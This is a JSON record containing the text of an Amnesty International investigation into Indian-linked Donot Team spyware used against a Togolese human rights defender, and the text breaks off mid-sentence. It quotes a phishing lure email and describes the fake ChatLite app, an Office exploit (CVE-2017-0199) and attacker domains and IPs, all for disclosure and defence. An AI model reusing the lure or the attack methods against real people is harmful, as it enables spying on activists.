{
    "id": "e003fe15-1bf4-4f12-87a1-58d387d43073",
    "created_at": "2022-10-25T16:48:19.944494Z",
    "updated_at": "2025-03-27T02:16:25.988449Z",
    "deleted_at": null,
    "sha1_hash": "0247dfd52784898815506925107a991587fa6b3c",
    "title": "Report",
    "authors": "",
    "file_creation_date": "2021-10-07T01:42:13Z",
    "file_modification_date": "2021-10-07T01:42:13Z",
    "file_size": 2053921,
    "plain_text": "# HACKERS-FOR-HIRE IN WEST AFRICA \n\n##### ACTIVIST IN TOGO ATTACKED WITH INDIAN-MADE SPYWARE\n\n\n-----\n\n##### Amnesty International is a movement of 10 million people which mobilizes the humanity in everyone and campaigns for change so we can all enjoy our human rights. \n\n Our vision is of a world where those in power keep their promises, respect international law and are held to account. \n\n We are independent of any government, political ideology, economic interest or religion and are funded mainly by our membership and individual donations. We believe that acting in solidarity and compassion with people everywhere can change our societies for the better. \n\n\n© Amnesty International 2021\nExcept where otherwise noted, content in this document is licensed under a Creative Commons\n(attribution, non-commercial, no derivatives, international 4.0) licence.\n[https://creativecommons.org/licenses/by-nc-nd/4.0/legalcode](https://creativecommons.org/licenses/by-nc-nd/4.0/legalcode)\n[For more information please visit the permissions page on our website: www.amnesty.org](http://www.amnesty.org/)\nWhere material is attributed to a copyright owner other than Amnesty International this\nmaterial is not subject to the Creative Commons licence.\n\nFirst published in 2021\nby Amnesty International Ltd\nPeter Benenson House, 1 Easton Street\nLondon WC1X 0DW, UK\n\n**Index: AFR 57/4756/2021**\n**Original language: English**\n###### amnesty org\n\n\n**_Cover photo: A drawing of an activist looking at a GPS location icon on the ground. A large mobile_**\n**phone overshadows the activist illustrating how individuals can be tracked by their mobile devices.**\n_© derooted_\n\n\n-----\n\n## CONTENTS\n\n###### 1. EXECUTIVE SUMMARY 5\n\n 2. METHODOLOGY 7\n\n 3. BACKGROUND 8\n\n 3.1 TARGETED SURVEILLANCE: A THREAT FOR HRDS 9\n\n 4. TECHNICAL INVESTIGATION 11\n\n 4.1 FIRST ATTACKS 11\n\n 4.2 INVESTIGATING THE ATTACK INFRASTRUCTURE 14\n\n 4.3 CONNECTIONS WITH DONOT TEAM 18\n\n 4.4 A FORTUITOUS DISCOVERY 18\n\n 4.5 LINKS BETWEEN INNEFU LABS IP ADDRESS AND ANDROID ATTACK INFRASTRUCTURE\n 20\n\n 4.6 LINKS BETWEEN INNEFU LABS AND THE SPYWARE ATTACK IN TOGO 22\n\n 4.7 WHO IS INNEFU LABS? 23\n\n 5. HUMAN RIGHTS CONCERNS 25\n\n 5.1 HUMAN RIGHTS CONCERNS AND INNEFU LABS’ RESPONSIBILITIES 25\n\n 5.2 CYBER MERCENARIES ON THE RISE 26\n\n 5.3 CIVIL SOCIETY UNDER SURVEILLANCE IN TOGO 27\n\n 5.4 SHRINKING SPACE FOR HUMAN RIGHTS WORK IN TOGO  27\n\n 6. CONCLUSION AND RECOMMENDATIONS 30\n\n 6.1 RECOMMENDATIONS 30\n\n ANNEX 1: COMMUNICATIONS WITH INNEFU LABS 33\n\nRESPONSE TO RESEARCH LETTER RECEIVED FROM INNEFU LABS ON 30 OCTOBER 2020 33\n\nRESPONSE FROM INNEFU LABS TO AMNESTY INTERNATIONAL ON 30 OCTOBER 2021 34\n\nRESPONSE FROM INNEFU LABS TO AMNESTY INTERNATIONAL ON 5 OCTOBER 2021 34\n\n###### ANNEX 2: TECHNICAL APPENDIX 36\n\nTECHNICAL ANALYSIS OF MALICIOUS DOCUMENTS AND SOFTWARE 36\n\n**HACKERS-FOR-HIRE IN WEST AFRICA**\nACTIVIST IN TOGO UNDER ATTACK WITH INDIAN-MADE SPYWARE\n\n\n-----\n\n## GLOSSARY\n\nWORD DESCRIPTION\n\n\nCOMMAND &\nCONTROL\n\n\nA Command & Control (C&C) server is the network infrastructure that is being\nused by an attacker to collect stolen information. Spyware would normally be\nconfigured to communicate with a particular Command & Control server,\nidentifiable either by a domain name or by an IP address.\n\n\nHACKER-FORHIRE\n\n\nA cyberthreat actor (“a hacker”) which performs offensive cyber operations on\nbehalf of its customers. These customers may include multiple government\nagencies, foreign governments or commercial entities.\n\n\nINTERNET SCAN An internet scan is a type of network measurement which involves making a\nconnection to all or a subset of systems available on the internet. This can be\nused to identify systems running a particular piece of software, such as a custom\ncommand & control server software.\n\nIP ADDRESS An IP address is an unique string of characters used to identify a computer which\nis communicating over the Internet or a local network. IP addresses are used to\nidentify the source and recipient of an IP packet on the network.\n\nMALWARE Malicious software that is designed to be silently installed on a victim’s computer\nor phone with the intent to steal private information or perform other forms of\nfraud.\n\nPHISHING A form of cyberattack in which fake login pages of legitimate services (such as\nGmail or Facebook) are created and distributed in order to collect victims’\nusernames and passwords.\n\n\nSPYWARE OR\nTROJAN\n\n\nMalware that is designed to stealthily spy on the victim’s computer or phone and\ncontinuously monitor communications and steal private information and files.\n\n\nSQL Structured Query Language (SQL) is a computer language designed for storing\nand modifying records in a relation database. Relation databases can be exported\nin a textual format which adheres to the SQL standard.\n\nTHREAT ACTOR A threat actor is a term used to in the cyber community to refer to the individual\nor group responsible for a set of attack campaigns.\n\n**HACKERS-FOR-HIRE IN WEST AFRICA**\nACTIVIST IN TOGO UNDER ATTACK WITH INDIAN-MADE SPYWARE\n\n\n-----\n\n## 1. EXECUTIVE SUMMARY\n\n###### “Having realized that this was an attempt at digital espionage, I felt in danger. I can't believe that my work could be so disturbing to some people that they would try to spy on me. I am not the only one working for human rights in Togo. Why me?”\n\nTogo-based human rights defender who was targeted by this surveillance campaign.\n\nAmnesty International has uncovered a targeted digital attack campaign against a prominent human rights\ndefender (HRD) in Togo. The HRD was targeted in late 2019 and early 2020 with both Android and\nWindows spyware. The attackers did not successfully compromise the HRD’s devices.\n\nThe Amnesty International Security Lab investigation found that the spyware used in these attack attempts is\ntied to an attacker group known in the cybersecurity industry as the Donot Team, previously connected to\nattacks in India, Pakistan and neighbouring countries in South Asia. Digital records identified during this\ninvestigation reveal that hundreds of individuals across South Asia and the Middle East were also targeted by\nDonot Team Android spyware. However, further investigation into these targets is outside the remit of this\nreport as it focuses on the digital attacks against the Togolese HRD.\n\nAmnesty International has also identified apparent links between the Donot Team spyware and an Indian\ncybersecurity company, Innefu Labs Pvt. Ltd., which advertises digital security, data analytics, and predictive\npolicing services to law enforcement and armed forces. Amnesty International found two key pieces of\nevidence connecting Innefu Labs to the Donot Team Android spyware and to the specific infrastructure used\nto deliver the Android spyware to the HRD in Togo.\n\nFirstly, Amnesty International found a screenshot from an infected test Android phone exposed on a Donot\nTeam server. The screenshot shows an operator apparently testing the Donot Team Android spyware. The\noperator is communicating with a WhatsApp account called “UserTester” and sending messages such as\n“Testing WhatsApp notifications”. This suggests the attacker is testing the functionality of the spyware.\n\nThe screenshot was taken as the attacker was in the process of typing using the custom SwiftKey keyboard\non the device. The SwiftKey keyboard suggested two URLs which had previously been typed and stored on\nthe custom keyboard. One of these URLs was the spyware distribution website, bulk[.]fun, used to send\nspyware to the HRD in Togo. The other was an IP address tied to Innefu Labs.\n\nThe Innefu Labs IP address and the bulk[.]fun URL would only be suggested by the keyboard if the attacker\nusing this test phone had previously interacted with both the spyware server and the Innefu Labs IP address.\n\nSecondly, the same Innefu Labs IP address was recorded in log files left publicly exposed on the bulk[.]fun\nwebsite used to distribute Donot Team spyware. This links the Innefu Labs IP address not only to the testing\nof the Donot Team Android spyware, but to the specific Internet infrastructure involved in the distribution of\nthe spyware used to target the HRD in Togo.\n\n**HACKERS-FOR-HIRE IN WEST AFRICA**\nACTIVIST IN TOGO UNDER ATTACK WITH INDIAN-MADE SPYWARE\n\n\n-----\n\nAdditional circumstantial evidence corroborating spyware development activity linked to Innefu Labs is\npresented later in this report.\n\nThe technical evidence suggests that Innefu Labs is involved in the development or deployment of some\nDonot Team spyware tools. These tools may then be used by a range of hacker-for-hire actors which are\ngrouped under the “Donot Team” cluster.\n\nThere is no sufficient evidence to indicate whether Innefu Labs had any direct involvement in the targeting of\nthe HRD in Togo. Although the Innefu Labs IP address is connected to both the spyware distribution website\nand to the Donot Team spyware, Innefu Labs may not necessarily know how any third parties are using these\nspyware tools.\n\nThe activity linked to the Donot Team may involve multiple distinct actors or organisations with access to the\nsame custom spyware toolset. The identity of all individuals or groups involved with Donot Team activity is\nunknown. This report focuses only on the actors linked to the attempted attacks against the HRD in Togo.\nThese attacks may involve only a subset of the Donot Team attack group or be linked to a separate group\nwith access to the Donot Team spyware tools.\n\nBased on the evidence collected in this research Amnesty International believes that Innefu Labs may play a\nrole in the development and/or deployment of some of the spyware tools which have been previously linked\nto Donot Team.\n\nThis case highlights the threat “hacker-for-hire”-type attacks pose to human rights defenders and to civil\nsociety globally. “Hacker-for-hire” attacks are offensive cyber operations performed by a threat actor (“a\nhacker”) normally on behalf of paying customers. These customers may include domestic government\nagencies, foreign governments or commercial entities. Cyber operations can be used for intelligence\ngathering, destructive attacks (such as damaging industrial systems) or financial gain.\n\nInnefu Labs should urgently conduct an external audit and publish the findings of the audit regarding the\napparent links between Innefu Labs and the spyware infrastructure used in the attacks against the HRD\nfrom Togo. Innefu Labs should further urgently adopt a human rights policy and conduct adequate human\nrights due diligence, the results of which should be disclosed, to identify, prevent, mitigate, and address any\nadverse human rights impacts which Innefu Labs may cause, contribute to, or be directly linked to.\n\nStates have a responsibility to respect and protect human rights. The Indian government should launch a\ncredible, transparent, independent, and impartial investigation into the cyberattacks which are linked to the\nDonot Team group and to Innefu Labs. Further, authorities in both India and Togo should impose an\nimmediate moratorium on the sale, transfer, and use of spyware technology until there is a robust human\nrights-compliant regulatory framework in place.\n\nThe Togo government should take steps to investigate, and redress the harm caused by such attacks from\nprivate actors or entities.\n\n**HACKERS-FOR-HIRE IN WEST AFRICA**\nACTIVIST IN TOGO UNDER ATTACK WITH INDIAN-MADE SPYWARE\n\n\n-----\n\n## 2. METHODOLOGY\n\nThis report investigates attempted targeted digital surveillance against a prominent HRD based in Togo. It\ncovers specific attack attempts that occurred between December 2019 and January 2020. The primary\ninvestigation occurred in early 2020 with additional technical research carried out in the spring of 2021.\n\nIn December 2019, Amnesty International’s Security Lab was contacted by the HRD after they began\nreceiving suspicious messages on their mobile phone and later by email. The HRD is not named in this\nreport for security reasons.\n\nAmnesty International investigated the attempted attacks using a multidisciplinary research method.\nPrimarily the attacks and related spyware samples were analysed using technical malware analysis and\nreverse engineering techniques. Suspicious samples were run in malware sandboxes and manually analysed\nto confirm malicious behaviour. Malware sandboxes are isolated computer environments where spyware can\nbe safely run, and its behaviour monitored and recorded.\n\nStarting with the initial spyware samples, Amnesty International’s Security Lab utilized an internet-wide\nnetwork scanning methodology to identify additional servers, infrastructure and other digital resources which\nwere owned or controlled by the threat actor linked to these digital attacks.\n\nThis report also draws on threat intelligence reports published by companies in the cybersecurity industry\nwhich describe spyware attacks used by this and related threat actors over the past 10 years. While these\nreports provided context on the threat actor, they were not used as part of the attribution of these attacks. All\ndata used for attribution of these attacks was obtained directly by Amnesty International from open sources\nand publicly exposed locations on attacker-linked infrastructure.\n\nAmnesty International also used standard “open-source intelligence” techniques to identify relevant publicly\navailable information from websites and social media. This information was used to corroborate information\ninitially discovered using the described technical research methodology.\n\nAdditionally, Amnesty International collected testimony from the HRD who was targeted by these attacks.\nRelevant human rights literature was reviewed when preparing this report.\n\n**HACKERS-FOR-HIRE IN WEST AFRICA**\nACTIVIST IN TOGO UNDER ATTACK WITH INDIAN-MADE SPYWARE\n\n\n-----\n\n## 3. BACKGROUND\n\nIn December 2019, Togolese President Faure Gnassingbé was seeking to run for a fourth term in the then\nupcoming February 2020 elections. In May 2019, the parliament had approved a constitutional change\npermitting the incumbent president to potentially stay in office until 2030. The opposition had boycotted\nlegislative elections in December 2018, in part because of the dispute over term limits.\n\nThe presidential election took place in February 2020. Faure Gnassingbé was elected for a fourth term\nfollowing the election with 72% of the votes. The re-election was contested by the opposition.\n\nIn the backdrop of a tense political climate and in anticipation of the elections, Togo experienced a\ncrackdown against peaceful dissent. During this time a prominent Togolese HRD, who wishes to remain\nanonymous for security reasons, reached out to Amnesty International’s Security Lab alarmed by suspicious\nWhatsApp messages they were receiving on their mobile phone.\n\nThese messages were sent from a WhatsApp account registered to an Indian phone number. The account\nrepeatedly wrote in English, encouraging the HRD to install an Android chat application in order to continue\ntheir communications.\n\nThis was not a normal Android application. Instead, it was piece of custom Android spyware designed to\nextract some of the most sensitive and personal information stored on the HRD’s phone. If successfully\ninstalled on the device, it would allow the attackers to record the camera and microphone, collect photos\nand files stored on the device, and even read encrypted WhatsApp messages as they were being sent and\nreceived. Amnesty International’s Security Lab investigated these attacks and identified the threat actor\ncommonly known as Donot Team within the cybersecurity industry as responsible. Details of this\ninvestigation are set out in the following chapter.\n\nPreviously reported attack campaigns were tied to Donot Team based on the use of a common set of custom\nspyware tools and infrastructure. The Donot Team attacks may involve multiple distinct actors or\norganisations with access to the same custom spyware toolset. The identity of all individuals or groups\ninvolved with Donot Team activity is unknown.\n\n[Previously, this group has only been publicly linked to digital attacks on political and military targets in South](http://blog.ptsecurity.com/2019/11/studying-donot-team.html)\nAsia.[1]\n\n\n**A threat actor is a term used in the cybersecurity community to refer to the individual or group responsible for a set of**\n**attack campaigns. Cybersecurity researchers create nicknames, in this case Donot Team, to refer to an actor. The**\n**identity or the affiliation of the actor may or may not be known. These attack campaigns can be linked based on the use**\n**of the same non-public spyware tools, the use of related infrastructure between campaigns, or based on common**\n**targeting.**\n\n\n1 Positive Technologies, “Studying Donot Team”, 25 November 2019,\nweb.archive.org/web/20210303051117/http://blog.ptsecurity.com/2019/11/studying-donot-team.html.\n\n**HACKERS-FOR-HIRE IN WEST AFRICA**\nACTIVIST IN TOGO UNDER ATTACK WITH INDIAN-MADE SPYWARE\n\n\n-----\n\n###### 3.1 TARGETED SURVEILLANCE: A THREAT FOR HRDS\n\nThe targeting of HRDs using digital surveillance technology is unlawful under international human rights law.\nAmnesty International believes that the Togolese HRD was targeted solely on the basis of their human rights\nwork. The prominent HRD has a long history of working with Togolese civil society organisations and is an\nessential voice for human rights in the country. There is no suggestion that this HRD has been targeted for\nany legitimate purpose or charged with any crime. This unlawful surveillance violates their right to privacy\nand impinges on their rights to freedom of expression and opinion, of association and of peaceful assembly.\n\nBoth the Universal Declaration of Human Rights and the International Covenant on Civil and Political Rights\n[protect these rights. The Covenant guarantees the right to hold opinions without interference and the right to](https://www.ohchr.org/EN/ProfessionalInterest/Pages/CCPR.aspx)\nfree expression (Article 19) and guards against arbitrary and unlawful intrusion of privacy (Article 17).\n\nInternational law and standards also require that any interference by the state on the right to privacy should\nbe lawful, necessary, proportional, and legitimate. States are required to ensure that individuals whose rights\n[have been violated have access to remedy (Article 2(3)). This includes the positive obligation to take](https://docstore.ohchr.org/SelfServices/FilesHandler.ashx?enc=6QkG1d%2FPPRiCAqhKb7yhsjYoiCfMKoIRv2FVaVzRkMjTnjRO%2Bfud3cPVrcM9YR0iW6Txaxgp3f9kUFpWoq%2FhW%2FTpKi2tPhZsbEJw%2FGeZRASjdFuuJQRnbJEaUhby31WiQPl2mLFDe6ZSwMMvmQGVHA%3D%3D)\nappropriate measures to prevent, punish, investigate or redress the harm caused by such acts by private\npersons or entities, including from harm caused by surveillance companies.\n\nUnder the UN Guiding Principles on Business and Human Rights, all companies themselves have an\nindependent responsibility to respect human rights.[2] This responsibility “… is a global standard of expected\nconduct for all business enterprises wherever they operate… and it exists over and above compliance with\nnational laws and regulations protecting human rights.”[3]\n\nIncreasingly, HRDs worldwide have to reckon with the growing threat of unlawful targeted surveillance,\nalongside more traditional methods of repression. Companies who produce and market cybersurveillance\ntools or who directly provide ‘hacker-for-hire' services on behalf of others have become dangerous actors\nresponsible for creating new tools for repression and exacerbating threats against those who defend our\nhuman rights.\n\nThe Pegasus Project, coordinated by Forbidden Stories with the technical support of Amnesty International’s\nSecurity Lab revealed how governments around the world have abused sophisticated cybersurveillance tools\nto unlawfully surveil journalists, HRDs and political opposition.[4] These revelations provide a snapshot of the\nabuses linked to just a single company operating in the offensive cybersurveillance industry.\n\nEven less is known about the “hacker-for-hire” industry. Due to weak regulatory and legal oversight,\ncompanies can freely sell their technology and services to private clients or countries where human rights\nare not protected or respected, and then in turn use the technology to track and monitor those who defend\nhuman rights. Multiple “hacker-for-hire” companies have advertised legitimate cybersecurity services while\ncovertly carrying out offensive digital attacks for their clients.[5]\n\nIt is often virtually impossible for HRDs to prove the existence of surveillance, either because of technical\nhurdles or because its use is covert. Even where targeting or the presence of an active infection cannot be\nproven, the fact of living under the constant threat of possible surveillance may constitute a human rights\nviolation in itself. Regardless of whether the attempt at surveillance is successful or not, the targeting of\nhuman rights activists instils fear and has a chilling effect on their ability to continue their work without\nundue interference. In many instances this leads those who defend human rights to self-censor and refrain\nfrom exercising their rights to freedom of expression, association and peaceful assembly. Inadequate\nregulation and oversight by the state – in violation of international standards – is the cause of this chilling\neffect, and therefore the responsibility of the state to remedy, in line with its obligations to respect, protect\nand fulfil human rights.\n\nThe threat of surveillance may also have a detrimental effect on the mental health of HRDs and information\nmay be used to divulge details in the public sphere exposing them and/or their contacts to personal attacks\n\n2 Office of the UN High Commissioner for Human Rights (OHCHR), Guiding Principles on Business and Human Rights: Implementing the\n_United Nations “Protect, Respect and Remedy” Framework, 2011 (UN Guiding Principles)._\n\n3 UN Guiding Principles, commentary to Principle 11.\n\n4 Amnesty International, “Massive data leak reveals Israeli NSO Group’s spyware used to target activists, journalists, and political leaders\n[globally”, 18 July 2021, amnesty.org/en/latest/press-release/2021/07/the-pegasus-project.](http://www.amnesty.org/en/latest/press-release/2021/07/the-pegasus-project/)\n\n5 John Scott-Railton and others, “Dark Basin: Uncovering a Massive Hack-For-Hire Operation”, Citizen Lab, 9 June 2020,\n_[citizenlab.ca/2020/06/dark-basin-uncovering-a-massive-hack-for-hire-operation.](https://citizenlab.ca/2020/06/dark-basin-uncovering-a-massive-hack-for-hire-operation/)_\n\n**HACKERS-FOR-HIRE IN WEST AFRICA**\nACTIVIST IN TOGO UNDER ATTACK WITH INDIAN-MADE SPYWARE\n\n\n-----\n\nand smear campaigns. All of this has a damaging knock-on effect on communities and societies whose\nrights HRDs are fighting for.\n\nIndeed, the Togolese HRD who was targeted told Amnesty International: “I felt in danger. I can't believe that\nmy work could be so disturbing to some people that they would try to spy on me. I am not the only one\nworking for human rights in Togo. Why me?\"\n\n**HACKERS-FOR-HIRE IN WEST AFRICA**\nACTIVIST IN TOGO UNDER ATTACK WITH INDIAN-MADE SPYWARE\n\n\n-----\n\n## 4. TECHNICAL\n INVESTIGATION\n\n###### 4.1 FIRST ATTACKS\n\nOn the 26 December 2019, the HRD in Togo received unexpected messages in English on their mobile\nphone on WhatsApp. The unknown contact pretended to know the HRD and tried to convince them to install\na chat application, seemingly called ChatLite:\n\n**HACKERS-FOR-HIRE IN WEST AFRICA**\nACTIVIST IN TOGO UNDER ATTACK WITH INDIAN-MADE SPYWARE\n\n\n-----\n\nAmnesty International analysed this application and confirmed that it was malicious and related to a known\nAndroid spyware family called “StealJob”.[6] Later the attackers sent the HRD two additional download links\nfor the app. At this point, the HRD was already aware that these messages were not legitimate. The\nsubsequent messages asking for new links were an attempt to collect additional information which was\nhelpful in tracing these attacks:\n\nBoth links pointed to the website https://bulk.fun/ and ended with two random characters. This website\nappeared to be a URL shortening service operated by the attackers. Each of the links redirected targets to\nmalicious Android applications. More information on URL shortening services and how they were used in\nthis attack is included in the next section of the report. The HRD did not click on the links but instead\nforwarded screenshots of the suspicious messages to the Amnesty International Security Lab.\n\n6 [QI-ANXIN, “StealJob: New Android malware used by Donot APT group”, 10 April 2019, ti.qianxin.com/blog/articles/stealjob-new-android-](https://ti.qianxin.com/blog/articles/stealjob-new-android-malware-used-by-donot-apt-group/)\n_[malware-used-by-donot-apt-group.](https://ti.qianxin.com/blog/articles/stealjob-new-android-malware-used-by-donot-apt-group/)_\n\n**HACKERS-FOR-HIRE IN WEST AFRICA**\nACTIVIST IN TOGO UNDER ATTACK WITH INDIAN-MADE SPYWARE\n\n\n-----\n\nThe Android application masqueraded as a chat application named ChatLite but it was actually a customdeveloped Android spyware tool that, when successfully deployed, allows the attackers to collect sensitive\ndata from victims’ mobile devices and install additional spyware tools.\n\n###### THE ATTACKERS CHANGE APPROACH\n\nThe first attempted attack on the HRD, who is French speaking, failed. The attacker’s strangely worded\nmessages, written in English and coming from an unknown Indian phone number alarmed the HRD who\nthen became immediately suspicious. Attempts to use French words such as “bonjour” alongside broken\nEnglish did not add to the attacker’s credibility.\n\nLess than a month later, the HRD was approached again, this time over email. The attackers took more care\nwith this second attempt. The email was written in French and was sent from a Gmail account\njimajemi096[@]gmail.com with the Togolese name “atwoki logo”.\n\n**HACKERS-FOR-HIRE IN WEST AFRICA**\nACTIVIST IN TOGO UNDER ATTACK WITH INDIAN-MADE SPYWARE\n\n\n-----\n\nSubject: important details\n\nhello,\nall the details of the file ..that is to be discussed.\n\nfirst save the file then you will see the contents (important)\n\nsee attached file\n\nThe email contained an attached malicious document which tries to exploit a previously fixed security flaw in\nMicrosoft Office.[7] Windows spyware would be installed if the document was opened in an older vulnerable\nversion of Microsoft Word.\n\nThis first stage spyware would eventually load Donot Team’s full Window spying tool known as the YTY\nframework. With the YTY framework installed, the attackers would gain complete access to the HRD’s\ncomputer.\n\nThe spyware can be used to steal files from the infected computer and any connected USB drives, record\nkeystrokes, take regular screenshots of the computer, and download additional spyware components.\n\nThis attack attempt was blocked by the HRD’s email security system. The email and attached malicious\ndocument triggered an automated security alert which resulted in the email being quarantined.\n\nThe YTY spyware is described in more detail in the Technical Appendix.\n\n###### 4.2 INVESTIGATING THE ATTACK INFRASTRUCTURE\n\nAmnesty International began this investigation by mapping the infrastructure used by the attackers to deliver\nthe Android spyware. A search for the bulk.fun domain on the VirusTotal malware database returned\nadditional samples of the same Android spyware. One named Kashmir_Voice_v4.8.apk and another named\nSafeShareV67.apk. Both samples were identified by multiple antivirus vendors as being related to Donot\nTeam.[8]\n\nSince 2018, security researchers have documented Donot Team attacks targeting organisations and\nindividuals in South Asia, primarily in Pakistan and India.[9 ]The targeting of this Togolese HRD is therefore\noutside the known geographic region of Donot Team’s previous activity.\n\nThe initial spyware link received in the WhatsApp messages was generated by an attacker-run URL\nshortener. A URL shortener generates short URLs which redirect to another web page. URL shorteners are\nused by attackers for two reasons: to hide the ultimate destination of a link; and to collect information about\nthe target when the link is opened, including their IP address, location, and the model of the target device.\n\n7 The malicious document loaded a remote template which attempted to exploit CVE-2017-0199, a vulnerability in handling RTF documents\nwith embedded OLE2 objects.\n\n[8 VirusTotal, virustotal.com/gui/file/93f54c94d9c5f6a3a709beb81cd734f2954d031e229b2a16627edf3463d18425/detection.](http://www.virustotal.com/gui/file/93f54c94d9c5f6a3a709beb81cd734f2954d031e229b2a16627edf3463d18425/detection)\n\n9 Netscout, “Donot Team Leverages New Modular Malware Framework in South Asia”, 8 March 2018,\n\n\n[netscout.com/blog/asert/donot-team-leverages-new-modular-malware-framework-south-asia.](http://www.netscout.com/blog/asert/donot-team-leverages-new-modular-malware-framework-south-asia)\n\n**HACKERS-FOR-HIRE IN WEST AFRICA**\nACTIVIST IN TOGO UNDER ATTACK WITH INDIAN-MADE SPYWARE\n\n\n-----\n\nThe URL shortener used by these attackers generated particularly short URLs containing just one or two\ncharacters. Amnesty International researchers were able to calculate and analyse all possible URLs\npreviously generated by the attackers, a technique we call “Short URL enumeration”.\n\nAmnesty International found that hundreds of the Donot Team short links that were collected pointed to\nAndroid applications hosted on the attackers’ servers using malicious domains such as ppadoaolnwod[.]xyz\nand officeframework[.]online. The large number of links suggest the attackers were distributing their Android\nspyware at a significant scale. The attackers may have generated unique links for targets to better track\nwhich target clicked on a spyware link. In addition, some links pointed to Donot Team related Windows\nspyware infrastructure and to credential phishing websites.\n\nOne shortened link pointed to a cybersecurity report about an attack linked to Donot Team which also used\ntheir YTY spyware. This suggests that the group is monitoring reports written about their own attack\ncampaigns.\n\n###### LOOKING BEHIND THE CURTAIN\n\nAmnesty International researchers also discovered many Nextcloud links shared through the URL shortener.\nNextcloud is an open-source software product that allows individuals or organisations to run their own file\nstorage and collaboration platform.\n\nIt is important to note that this Nextcloud server was hosted on the same server as the bulk.fun URL\nshortener on the IP address 82.196.5.24. The usage of the same server to host the original Android\n\n**HACKERS-FOR-HIRE IN WEST AFRICA**\nACTIVIST IN TOGO UNDER ATTACK WITH INDIAN-MADE SPYWARE\n\n\n-----\n\nspyware, the bulk.fun URL shortener, and now the Nextcloud, show that all three are strongly interlinked\nand controlled by the same attackers.\n\nAmnesty International researchers again downloaded all publicly accessible URLs hosted on the Nextcloud\nserver which were exposed by the URL shortener.\n\nThe attackers had used their own Nextcloud server to share documents, back up files and spyware samples\nbetween their team members. The attackers accidentally made this publicly available using their short links.\nThis particularly careless exposure of operational documents enabled Amnesty International to gain\nunprecedented insights into the activities of Donot Team. It was through this method that Amnesty\nInternational found a Zip file named Downloads.zip, shared by the attackers which contained two SQL\ndatabase files. SQL files are text files which are typically generated from a database server and are often\nused to back up or transfer data between servers.\n\nAn analysis of the database revealed information about many connections to the attack server by both the\nattackers and their targets, as well as logs and records from the attackers’ Android spyware distribution\nsystem, and from the URL shortener service. Each URL shortener click was recorded with the file ID, time,\nIP address, and device model of the target.\n\nEach of these database fields can be seen in the image below. Through these records, accidentally exposed\nby the attackers, Amnesty International was able to obtain detailed visibility into the spread of the Android\nspyware throughout the previous year.\n\nThe heatmap below shows locations where spyware was downloaded based on the downloader’s IP address.\nIP-based geolocation can vary in accuracy and should only be seen as an approximate indicator of the\nphysical location.\n\nDatacentre IPs and other IP addresses used by the attackers and third-party companies have been excluded\nfrom this heatmap.\n\n**HACKERS-FOR-HIRE IN WEST AFRICA**\nACTIVIST IN TOGO UNDER ATTACK WITH INDIAN-MADE SPYWARE\n\n\n-----\n\nThese SQL files were generated on 31 October 2019 and they contained no records of Togolese targets. This\nsuggests that the Donot Team only started using this infrastructure to target HRDs in Togo at some point in\nNovember or early December 2019. Amnesty International has not investigated suspected Donot Team\ntargeting outside of Togo.\n\n**HACKERS-FOR-HIRE IN WEST AFRICA**\nACTIVIST IN TOGO UNDER ATTACK WITH INDIAN-MADE SPYWARE\n\n\n-----\n\n###### 4.3 CONNECTIONS WITH DONOT TEAM\n\nDonot Team (also known as APT-C-35 or SectorE02) is a threat actor that was first identified and named by\n[the security company Netscout in March 2018. Netscout analysed the Donot Team Windows spyware tool](https://www.netscout.com/blog/asert/donot-team-leverages-new-modular-malware-framework-south-asia)\n“YTY” which was used in a targeted attack campaign.[10]\n\n[Donot Team is known to use custom-made spyware, such as YTY for Windows and StealJob for Android. The](https://ti.qianxin.com/blog/articles/stealjob-new-android-malware-used-by-donot-apt-group/)\ncybersecurity community has shown links between Donot Team and other threat actors such as the\n[Confucius group and the Operation Hangover attack campaign.[10] It is not clear from publicly available](https://blog.trendmicro.com/trendlabs-security-intelligence/deciphering-confucius-cyberespionage-operations/)\n[evidence if these campaigns are all linked to the same threat actor, or to several threat actors that may have](https://www.first.org/resources/papers/tallinn2019/Linking_South_Asian_cyber_espionnage_groups-to-publish.pdf)\ncollaborated at some stage.\n\nThis campaign is clearly linked to the Donot Team because all the spyware sent to the HRD are versions of\nthe custom spyware tools YTY or StealJob, which are known to be exclusively used by Donot Team (see the\ntechnical appendix for more information).\n\nBased on publicly available information, it is uncertain if Donot Team is one cohesive group or several\nconnected threat actors who share custom tools and infrastructure.\n\n###### 4.4 A FORTUITOUS DISCOVERY \n\nBy performing an internet-wide scan for servers answering to the unique communication protocol of Donot\nTeam’s StealJob Android spyware, Amnesty International was able to identify another spyware Command\nand Control (C&C) server that appeared to be used by the attackers to test the functionality of their Android\nspyware while it was under development.\n\nThis server was hosted on US cloud company Digital Ocean[11] at 198.211.118.246 with the domain name\nmimeversion[.]top. This domain is similar to mimestyle[.]xyz, the C&C server of the Android spyware sample\nsent to the HRD in Togo, also hosted on Digital Ocean. The use of a very similar domain name, the same\nhosting provider, and the same custom malware C&C software suggests this testing server is indeed closely\ntied to the group who targeted the HRD. Attackers may set up standalone testing C&C servers to test their\nspyware tools and server code before deploying the spyware against their intended targets.\n\nThe mimeversion[.]top server had a publicly accessible directory which exposed data uploaded from\ninfected test devices operated by Donot Team.\n\n10 Netscout, “Donot Team Leverages New Modular Malware Framework in South Asia”, 8 March 2018,\n\n[netscout.com/blog/asert/donot-team-leverages-new-modular-malware-framework-south-asia.](http://www.netscout.com/blog/asert/donot-team-leverages-new-modular-malware-framework-south-asia)\n\n11 Threat actors regularly abuse legitimate cloud services to run their attacks. Amnesty International informed Digital Ocean about malicious\nservers discovered during this investigation. Digital Ocean subsequently took steps to suspend and shutdown the malicious infrastructure.\n\n**HACKERS-FOR-HIRE IN WEST AFRICA**\nACTIVIST IN TOGO UNDER ATTACK WITH INDIAN-MADE SPYWARE\n\n\n-----\n\nMost of these directories contained screenshots from compromised Android phones. These screenshots\nwere generated by the attackers while testing their Android spyware’s screen capture and keylogging\ncapabilities.\n\nOne screenshot found on this server showed WhatsApp messages between an infected test device and a test\nWhatsApp account called “UserTester”. The phone is joined to the Indian Airtel telecom network. The\nOpenVPN icon in the status bar shows that the phone is connected to a VPN server. The attackers are likely\nusing the VPN to obscure their location when testing their spyware and interacting with the attack\ninfrastructure.\n\nIn this screenshot, the Android keyboard app autosuggested two different URLs previously typed in that\ndevice from which the screenshot was uploaded. One of these was bulk.fun, the attack domain originally\nsent to the Togolese HRD. The second suggested URL was IP address 122.160.158.3, located in India.\n\n**HACKERS-FOR-HIRE IN WEST AFRICA**\nACTIVIST IN TOGO UNDER ATTACK WITH INDIAN-MADE SPYWARE\n\n\n-----\n\nPassive DNS records show that the domain name server.authshieldserver.com has pointed to the IP 